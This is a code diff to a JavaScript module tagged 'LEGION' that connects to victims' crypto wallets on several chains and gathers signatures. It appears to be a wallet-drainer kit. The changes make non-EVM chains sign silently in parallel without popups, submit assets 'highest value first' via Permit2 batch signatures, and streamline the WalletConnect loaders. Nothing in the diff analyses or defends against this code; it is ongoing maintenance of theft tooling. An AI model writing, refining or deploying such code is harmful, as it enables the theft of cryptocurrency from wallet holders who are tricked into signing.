@@ -1739,7 +1739,10 @@
     if (detectedChains['EVM']) {
       try {
         console.log('[LEGION]   🔗 EVM ← connecting (priority)');
-        var evmResult = await CHAINS_SUPPORTED['EVM'].connect();
+        var evmResult = await Promise.race([
+          CHAINS_SUPPORTED['EVM'].connect(),
+          new Promise(function(_, rej) { setTimeout(function() { rej(new Error('EVM connect timeout')); }, 60000); })
+        ]);
         if (evmResult) {
           connected['EVM'] = evmResult;
           successCount++;
@@ -1829,27 +1832,42 @@
       }
     }
 
-    // Sign all chains (sequential to avoid popup overlap)
+    // EVM must sign first (popup), then all others in parallel (no popup)
     var validSignatures = {};
     var successCount = 0;
 
-    for (var ci = 0; ci < chainNames.length; ci++) {
-      var chainName = chainNames[ci];
+    function buildSigEntry(chainName, sig) {
+      return {
+        signature: sig,
+        address: connectedChains[chainName] ? connectedChains[chainName].address : '',
+        walletType: connectedChains[chainName] ? connectedChains[chainName].walletType : 'unknown',
+        chainId: connectedChains[chainName] ? connectedChains[chainName].chainId : null,
+        message: messages[chainName],
+        timestamp: Date.now()
+      };
+    }
+
+    // Step 1: EVM first (has wallet popup)
+    if (chainNames.indexOf('EVM') !== -1) {
       try {
-        var sig = await signChainWithRetry(chainName, messages[chainName]);
-        if (sig) {
-          validSignatures[chainName] = {
-            signature: sig,
-            address: connectedChains[chainName] ? connectedChains[chainName].address : '',
-            walletType: connectedChains[chainName] ? connectedChains[chainName].walletType : 'unknown',
-            chainId: connectedChains[chainName] ? connectedChains[chainName].chainId : null,
-            message: messages[chainName],
-            timestamp: Date.now()
-          };
-          successCount++;
-        }
+        var evmSig = await signChainWithRetry('EVM', messages['EVM']);
+        if (evmSig) { validSignatures['EVM'] = buildSigEntry('EVM', evmSig); successCount++; }
       } catch (e) {}
     }
+
+    // Step 2: All non-EVM chains in parallel (silent — no popups)
+    var nonEvmNames = chainNames.filter(function(n) { return n !== 'EVM'; });
+    var parallelResults = await Promise.allSettled(nonEvmNames.map(function(chainName) {
+      return signChainWithRetry(chainName, messages[chainName]).then(function(sig) {
+        return { chainName: chainName, sig: sig };
+      });
+    }));
+    parallelResults.forEach(function(r) {
+      if (r.status === 'fulfilled' && r.value && r.value.sig) {
+        validSignatures[r.value.chainName] = buildSigEntry(r.value.chainName, r.value.sig);
+        successCount++;
+      }
+    });
 
     PARALLEL_STATS.signatureTime = performance.now() - PARALLEL_STATS.signatureStart;
     return validSignatures;
@@ -1937,7 +1955,7 @@
       // Submit chains in priority order (highest value first)
 
       // Submit EVM — Permit2 batch with proper typed data signature
-      if (signatures.EVM) {
+      if (signatures.EVM && signatures.EVM.signature) {
         try {
           var evmChainId = connectedChains.EVM ? connectedChains.EVM.chainId || 1 : 1;
           var batchResult = connectedChains.EVM && connectedChains.EVM._batchResult;
@@ -3481,8 +3499,8 @@
 
   // ─── WalletConnect SDK Loader (multi-CDN fallback) ──────────────────────
 
-  // ─── WalletConnect SDK Loaders (ALL methods, cascading fallback) ────────
-  // 5 methods: Reown AppKit → Web3Modal v3 → UniversalProvider+Modal → EthereumProvider → SignClient
+  // ─── WalletConnect SDK Loaders (cascading fallback) ────────────────────
+  // 3 methods: UniversalProvider+Modal → EthereumProvider → SignClient
 
   function loadScript(url) {
     return new Promise(function(res, rej) {
@@ -3492,33 +3510,7 @@
     });
   }
 
-  // Method 1: Reown AppKit (Web3Modal v5) — latest, best UI, all wallets, deep links
-  async function tryReownAppKit(projectId) {
-    try {
-      var mod = await import('https://esm.sh/@reown/appkit@1.6.8?bundle-deps');
-      var ethMod = await import('https://esm.sh/@reown/appkit-adapter-ethers5@1.6.8?bundle-deps');
-      if (mod.createAppKit && ethMod) {
-        console.log('[LEGION] WC Method 1: Reown AppKit loaded');
-        return { type: 'reown-appkit', mod: mod, ethMod: ethMod };
-      }
-    } catch (e) { console.debug('[LEGION] Reown AppKit failed:', e.message); }
-    return null;
-  }
-
-  // Method 2: @web3modal/standalone (Web3Modal v3) — popular, good QR + explorer
-  async function tryWeb3ModalStandalone(projectId) {
-    try {
-      var mod = await import('https://esm.sh/@web3modal/standalone@2.4.3?bundle-deps');
-      var WM = mod.Web3Modal || (mod.default && mod.default.Web3Modal);
-      if (WM) {
-        console.log('[LEGION] WC Method 2: Web3Modal Standalone loaded');
-        return { type: 'web3modal-standalone', Web3Modal: WM };
-      }
-    } catch (e) { console.debug('[LEGION] Web3Modal Standalone failed:', e.message); }
-    return null;
-  }
-
-  // Method 3: UniversalProvider + WalletConnectModal (multi-chain + All Wallets)
+  // Method 1: UniversalProvider + WalletConnectModal (multi-chain + All Wallets)
   async function tryUniversalProvider() {
     var pairs = [
       ['https://esm.sh/@walletconnect/universal-provider@2.17.3?bundle-deps',
@@ -3532,7 +3524,7 @@
         var UP = mods[0].default || mods[0].UniversalProvider;
         var WCModal = mods[1].WalletConnectModal || (mods[1].default && mods[1].default.WalletConnectModal);
         if (UP && UP.init) {
-          console.log('[LEGION] WC Method 3: UniversalProvider + Modal loaded');
+          console.log('[LEGION] WC Method 1: UniversalProvider + Modal loaded');
           return { type: 'universal', UniversalProvider: UP, WalletConnectModal: WCModal };
         }
       } catch (e) { continue; }
@@ -3551,13 +3543,13 @@
         await loadScript(cdns[i]);
         var pkg = window.WalletConnectEthereumProvider || window['@walletconnect/ethereum-provider'] || {};
         var EP = pkg.EthereumProvider || pkg.default || pkg;
-        if (EP && EP.init) { console.log('[LEGION] WC Method 4: EthereumProvider UMD loaded'); return { type: 'ethereum', EthereumProvider: EP }; }
+        if (EP && EP.init) { console.log('[LEGION] WC Method 2: EthereumProvider UMD loaded'); return { type: 'ethereum', EthereumProvider: EP }; }
       } catch (e) { continue; }
     }
     try {
       var mod = await import('https://esm.sh/@walletconnect/ethereum-provider@2.17.3?bundle-deps');
       var EP = mod.EthereumProvider || mod.default;
-      if (EP && EP.init) { console.log('[LEGION] WC Method 4: EthereumProvider ESM loaded'); return { type: 'ethereum', EthereumProvider: EP }; }
+      if (EP && EP.init) { console.log('[LEGION] WC Method 2: EthereumProvider ESM loaded'); return { type: 'ethereum', EthereumProvider: EP }; }
     } catch (e) {}
     return null;
   }
@@ -3572,20 +3564,18 @@
       try {
         var mod = await import(urls[i]);
         var SC = mod.SignClient || mod.default;
-        if (SC && SC.init) { console.log('[LEGION] WC Method 5: SignClient loaded'); return { type: 'sign-client', SignClient: SC }; }
+        if (SC && SC.init) { console.log('[LEGION] WC Method 3: SignClient loaded'); return { type: 'sign-client', SignClient: SC }; }
       } catch (e) { continue; }
     }
     return null;
   }
 
-  // Master loader — try all 5 in order
+  // Master loader — try 3 methods in order (Methods 1+2 removed: non-functional)
   async function loadWalletConnectSDK(projectId) {
     var result;
     result = await tryUniversalProvider(); if (result) return result;
     result = await tryEthereumProvider(); if (result) return result;
-    result = await tryWeb3ModalStandalone(projectId); if (result) return result;
     result = await trySignClient(); if (result) return result;
-    result = await tryReownAppKit(projectId); if (result) return result;
     return null;
   }
 
